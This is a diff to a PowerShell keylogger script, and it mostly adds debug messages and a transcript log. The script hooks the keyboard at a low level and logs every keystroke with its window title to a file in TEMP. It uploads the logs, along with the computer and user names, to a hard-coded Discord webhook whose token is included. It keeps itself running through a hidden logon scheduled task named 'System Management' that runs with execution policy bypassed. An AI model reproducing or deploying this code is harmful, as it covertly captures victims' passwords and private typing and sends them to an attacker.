@@ -1,9 +1,16 @@
 $webhookUrl = "https://discord.com/api/webhooks/1370769053525868636/K7tsBhS0bi0S9Y-TusKDpF1dbmE0PUPbYgn0FG0Yu1qAzOxTmx6yuIiyUsCMGroal1ib"
 $dataPath = "$env:TEMP\sysdata.json"
 $deviceId = "DIGISK01"
+$logPath = "$env:TEMP\keylogger.log"
+
+# Start logging to file
+Start-Transcript -Path $logPath -Append
+
+Write-Host "Keylogger started - $(Get-Date)" -ForegroundColor Green
 
 if (!(Test-Path $dataPath)) {
     Set-Content -Path $dataPath -Value "{`"device`":`"$deviceId`",`"logs`":[]}" -Force
+    Write-Host "Created new data file at $dataPath"
 }
 
 Add-Type -AssemblyName System.Windows.Forms
@@ -27,9 +34,7 @@ public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
 
 Add-Type -MemberDefinition $APIsignatures -Name WinAPI -Namespace KeyLogger
 
-
 $WH_KEYBOARD_LL = 13
-
 
 $keyboardHookDelegate = [KeyLogger.WinAPI+HookProc] {
     param($nCode, $wParam, $lParam)
@@ -39,28 +44,25 @@ $keyboardHookDelegate = [KeyLogger.WinAPI+HookProc] {
         $keyState = [System.Windows.Forms.Keys]$vkCode
         $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
         
-        # Get window title
         try {
-            $activeWindow = (Get-Process -id (Get-Process -id $pid).SessionId).MainWindowTitle
+            $activeWindow = (Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Sort-Object -Property MainWindowTitle | Select-Object -First 1).MainWindowTitle
             if ([string]::IsNullOrEmpty($activeWindow)) { $activeWindow = "Unknown" }
         } catch {
             $activeWindow = "Unknown"
         }
         
-        # Create key info
         $keyDetails = @{
             'timestamp' = $timestamp
             'key' = $keyState.ToString()
             'window' = $activeWindow
         }
         
-        # Load JSON and update it
         try {
             $jsonData = Get-Content -Path $dataPath -Raw | ConvertFrom-Json
             $jsonData.logs += $keyDetails
             $jsonData | ConvertTo-Json -Depth 3 -Compress | Set-Content -Path $dataPath -Force
         } catch {
-            # If error, try to recreate the JSON file
+            Write-Host "Error updating JSON: $_" -ForegroundColor Red
             Set-Content -Path $dataPath -Value "{`"device`":`"$deviceId`",`"logs`":[]}" -Force
         }
     }
@@ -68,29 +70,50 @@ $keyboardHookDelegate = [KeyLogger.WinAPI+HookProc] {
     return [KeyLogger.WinAPI]::CallNextHookEx([IntPtr]::Zero, $nCode, $wParam, $lParam)
 }
 
-$hookId = [KeyLogger.WinAPI]::SetWindowsHookEx($WH_KEYBOARD_LL, $keyboardHookDelegate, [KeyLogger.WinAPI]::GetModuleHandle($null), 0)
+try {
+    $hookId = [KeyLogger.WinAPI]::SetWindowsHookEx($WH_KEYBOARD_LL, $keyboardHookDelegate, [KeyLogger.WinAPI]::GetModuleHandle($null), 0)
+    Write-Host "Keyboard hook installed successfully"
+} catch {
+    Write-Host "Failed to install keyboard hook: $_" -ForegroundColor Red
+    exit 1
+}
 
 function Test-Internet {
     try {
         $response = Invoke-WebRequest -Uri 'https://www.google.com' -UseBasicParsing -TimeoutSec 3
         return ($response.StatusCode -eq 200)
     } catch {
+        Write-Host "Internet test failed: $_" -ForegroundColor Yellow
         return $false
     }
 }
 
 function Send-Data {
-    if (!(Test-Path $dataPath)) { return }
-    if (!(Test-Internet)) { return }
+    if (!(Test-Path $dataPath)) { 
+        Write-Host "Data file not found" -ForegroundColor Yellow
+        return 
+    }
     
-    $jsonData = Get-Content -Path $dataPath -Raw | ConvertFrom-Json
+    if (!(Test-Internet)) { 
+        Write-Host "No internet connection" -ForegroundColor Yellow
+        return 
+    }
     
-    if ($jsonData.logs.Count -eq 0) { return }
+    try {
+        $jsonData = Get-Content -Path $dataPath -Raw | ConvertFrom-Json
+    } catch {
+        Write-Host "Error reading JSON data: $_" -ForegroundColor Red
+        return
+    }
+    
+    if ($jsonData.logs.Count -eq 0) { 
+        Write-Host "No logs to send" -ForegroundColor Yellow
+        return 
+    }
     
     $computerName = $env:COMPUTERNAME
     $userName = $env:USERNAME
     
-    # Create webhook payload
     $payload = @{
         'username' = 'KeyLogger'
         'content' = "Keylog data from $computerName / $userName"
@@ -119,13 +142,12 @@ function Send-Data {
         )
     }
     
-    $payloadJson = $payload | ConvertTo-Json -Depth 4
-    
     try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson
+        Write-Host "Sending initial payload to webhook..."
+        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body ($payload | ConvertTo-Json -Depth 4)
         
-        # Send the actual data in chunks (Discord has message size limits)
         $chunks = [Math]::Ceiling($jsonData.logs.Count / 25)
+        Write-Host "Sending $chunks chunks of data..."
         
         for ($i = 0; $i -lt $chunks; $i++) {
             $start = $i * 25
@@ -141,63 +163,69 @@ function Send-Data {
             }
             
             Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body ($chunkData | ConvertTo-Json -Depth 4)
+            Write-Host "Sent chunk $($i+1)/$chunks"
             Start-Sleep -Seconds 1
         }
         
-        # Clear logs after successful send
         $jsonData.logs = @()
         $jsonData | ConvertTo-Json -Depth 3 | Set-Content -Path $dataPath -Force
+        Write-Host "Data sent successfully and local logs cleared" -ForegroundColor Green
     } catch {
-        # If failed, we'll try again next time
+        Write-Host "Error sending data: $_" -ForegroundColor Red
     }
 }
 
 function Setup-Persistence {
-    # Create a copy of this script
     $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Definition -Raw
     $scriptPath = "$env:TEMP\sysmgr.ps1"
     Set-Content -Path $scriptPath -Value $scriptContent -Force
     
-    # Create scheduled task
     $taskAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
     $taskTrigger = New-ScheduledTaskTrigger -AtLogon
     $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
     $taskName = "System Management"
     
-    # Register the task
     try {
         $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
         if (!$existingTask) {
             $task = New-ScheduledTask -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings
             Register-ScheduledTask -TaskName $taskName -InputObject $task -Force
+            Write-Host "Persistence task created" -ForegroundColor Green
+        } else {
+            Write-Host "Persistence task already exists" -ForegroundColor Yellow
         }
     } catch {
-        # Silently continue if we don't have permission
+        Write-Host "Error creating persistence task: $_" -ForegroundColor Red
     }
 }
 
-# Setup persistence
 Setup-Persistence
 
-# Create a timer to check for connection and send data
+# Immediate test send
+Send-Data
+
+# Create and start timer
 $timer = New-Object System.Timers.Timer
-$timer.Interval = 60000  # Check every minute
+$timer.Interval = 60000  # 1 minute
 $timer.AutoReset = $true
 $timer.Enabled = $true
 
-# Register event for timer
 Register-ObjectEvent -InputObject $timer -EventName Elapsed -Action {
+    Write-Host "Timer elapsed - checking for data to send..."
     Send-Data
-}
+} | Out-Null
 
-# Keep script running
+Write-Host "Keylogger running. Press Ctrl+C to stop." -ForegroundColor Green
+
 try {
     while ($true) {
         Start-Sleep -Seconds 60
     }
 } finally {
-    # Cleanup if script is stopped
+    Stop-Transcript
     if ($hookId -ne [IntPtr]::Zero) {
         [KeyLogger.WinAPI]::UnhookWindowsHookEx($hookId)
+        Write-Host "Keyboard hook uninstalled" -ForegroundColor Yellow
     }
+    Write-Host "Keylogger stopped" -ForegroundColor Red
 }
